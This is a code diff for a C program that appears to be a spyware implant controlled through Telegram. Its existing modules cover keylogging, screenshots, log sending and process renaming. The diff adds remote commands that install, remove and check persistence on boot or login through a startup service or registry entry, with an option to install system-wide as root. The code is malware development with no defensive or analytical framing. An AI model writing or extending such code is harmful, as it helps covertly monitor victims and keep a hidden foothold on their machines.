@@ -21,6 +21,7 @@
 #include "../config/config.h"
 #include "../crypto/crypto.h"
 #include "../files/files.h"
+#include "../install/install.h"
 #include "../keyboard/keyboard.h"
 #include "../keyboard/keyboard_output.h"
 #include "../logging/log_sender.h"
@@ -212,6 +213,9 @@ typedef enum {
   CMD_RESTART_SCREENSHOT,
   CMD_RESTART_LOGS,
   CMD_RESTART_ALL,
+  CMD_INSTALL,
+  CMD_UNINSTALL,
+  CMD_AUTOSTART,
   CMD_STATUS,
   CMD_INFO,
   CMD_KILL,
@@ -271,6 +275,9 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"restart_screenshot", CMD_RESTART_SCREENSHOT}, {"restart_screen", CMD_RESTART_SCREENSHOT}, {"restart_shot", CMD_RESTART_SCREENSHOT}, {"reset_screenshot", CMD_RESTART_SCREENSHOT}, {"reset_screen", CMD_RESTART_SCREENSHOT}, {"reset_shot", CMD_RESTART_SCREENSHOT},
   {"restart_logs", CMD_RESTART_LOGS}, {"restart_log", CMD_RESTART_LOGS}, {"reset_logs", CMD_RESTART_LOGS}, {"reset_log", CMD_RESTART_LOGS},
   {"restart_all", CMD_RESTART_ALL}, {"reset_all", CMD_RESTART_ALL},
+  {"install", CMD_INSTALL}, {"autorun", CMD_INSTALL}, {"startup", CMD_INSTALL}, {"install_autostart", CMD_INSTALL}, {"install_service", CMD_INSTALL},
+  {"uninstall", CMD_UNINSTALL}, {"uninstall_autostart", CMD_UNINSTALL}, {"remove_autostart", CMD_UNINSTALL}, {"disable_autostart", CMD_UNINSTALL},
+  {"autostart", CMD_AUTOSTART}, {"autostart_status", CMD_AUTOSTART}, {"install_status", CMD_AUTOSTART},
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
   {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
@@ -2011,6 +2018,43 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_INSTALL: {
+    const char *arg = get_command_argument(text);
+    while (*arg && isspace((unsigned char)*arg))
+      arg++;
+    if (match_command(arg, "remove") || match_command(arg, "disable") ||
+        match_command(arg, "uninstall") || match_command(arg, "off")) {
+      char detail[1024] = {};
+      (void)c2t_uninstall_autostart(0, detail, sizeof(detail));
+      telegram_send_html(detail);
+    } else if (match_command(arg, "status") || match_command(arg, "check")) {
+      char detail[1024] = {};
+      (void)c2t_get_autostart_status(detail, sizeof(detail));
+      telegram_send_html(detail);
+    } else {
+      int system_wide =
+          match_command(arg, "system") || match_command(arg, "root");
+      char detail[1024] = {};
+      (void)c2t_install_autostart(system_wide, detail, sizeof(detail));
+      telegram_send_html(detail);
+    }
+    break;
+  }
+
+  case CMD_UNINSTALL: {
+    char detail[1024] = {};
+    (void)c2t_uninstall_autostart(0, detail, sizeof(detail));
+    telegram_send_html(detail);
+    break;
+  }
+
+  case CMD_AUTOSTART: {
+    char detail[1024] = {};
+    (void)c2t_get_autostart_status(detail, sizeof(detail));
+    telegram_send_html(detail);
+    break;
+  }
+
   case CMD_KILL: {
     c2t_log_warning(
         "listener",
@@ -2041,6 +2085,8 @@ static void handle_command(const telegram_incoming_update_t *update,
         "• <code>/info</code> (or <code>/start</code>) - View host info &amp; startup summary\n"
         "• <code>/status</code> - View daemon status &amp; throughput state\n"
         "• <code>/process_name [name]</code> (or <code>/rename</code>, <code>/procname</code>) - View or change process name\n"
+        "• <code>/install [enable|remove|status]</code> (or <code>/autostart</code>) - Configure startup on boot/login\n"
+        "• <code>/uninstall</code> - Remove startup service / registry entry\n"
         "• <code>/restart [subsystem|all|daemon]</code> (or <code>/reset</code>, <code>/reboot</code>) - Restart subsystems or full daemon\n"
         "• <code>/logs</code> - Flush and retrieve execution logs\n"
         "• <code>/pause</code> - Pause all active monitoring\n"
@@ -2174,6 +2220,9 @@ static int is_heavy_command(c2t_cmd_id_t cmd) {
   case CMD_RESTART_SCREENSHOT:
   case CMD_RESTART_LOGS:
   case CMD_RESTART_ALL:
+  case CMD_INSTALL:
+  case CMD_UNINSTALL:
+  case CMD_AUTOSTART:
     return 1;
   default:
     return 0;
